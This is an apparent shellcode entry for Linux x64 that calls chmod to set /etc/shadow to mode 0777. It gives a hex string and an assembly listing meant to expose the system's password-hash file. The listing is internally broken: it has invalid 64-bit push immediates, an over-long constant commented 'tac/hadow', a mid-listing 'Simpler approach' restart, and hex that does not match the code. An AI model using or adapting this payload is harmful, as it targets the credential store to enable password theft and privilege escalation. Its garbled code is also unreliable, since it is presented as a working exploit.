; Title:    Linux x64 chmod 777 /etc/shadow
; Platform: linux
; Arch:     x64
; Size:     35 bytes
; Encoding: raw
;
; Assembled hex:
; \x48\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x73\x68\x61\x68\x74\x63\x2f\x65\x68\x2f\x65\x74\x63\x48\x89\xe7\x66\xbe\xff\x01\xb0\x5a\x0f\x05

BITS 64
global _start

_start:
    ; chmod("/etc/shadow", 0777)
    xor     rax, rax
    push    rax                 ; null byte
    push    0x776f6461         ; "adow"
    push    0x68732f6374       ; "/sha" — note: adjust to build string
    push    0x652f6374
    push    0x652f
    ; Simpler approach:
    push    rax
    mov     rbx, 0x776f6461682f636174  ; "tac/hadow"
    push    rbx
    mov     rbx, 0x65742f2f2f2f2f2f
    push    rbx
    mov     rdi, rsp            ; "/etc/shadow"
    mov     si, 0x1ff           ; 0777 octal
    mov     al, 0x5a            ; chmod syscall
    syscall
